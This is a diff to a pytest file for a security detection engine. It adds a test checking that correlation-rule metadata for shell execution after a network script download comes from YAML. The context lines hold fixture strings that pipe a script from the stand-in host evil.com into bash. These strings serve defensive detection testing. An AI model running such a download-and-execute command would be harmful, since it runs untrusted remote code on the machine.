@@ -1,5 +1,17 @@
 import pytest
-from app.detection.engine.correlation_engine import _is_event_a, _extract_url
+from app.detection.engine.correlation_engine import _is_event_a, _extract_url, CorrelationMatch
+
+
+def test_correlation_match_metadata_sourced_from_yaml():
+    """rule_id/name/risk/severity/mitre come from engine_meta YAML, not hardcode."""
+    m = CorrelationMatch()
+    assert m.rule_id == "linux_t1059_download_then_shell_execution"
+    assert m.rule_name == "Network Script Download Followed by Shell Execution"
+    assert m.risk_score == 70
+    assert m.severity == "high"
+    assert m.mitre_tactic == "TA0002"
+    assert m.mitre_technique == "T1059.004"
+
 
 CMD_URL_SHELL = "http://evil.com/s.sh | bash"
 CMD_URL_ONLY = "http://evil.com/payload"
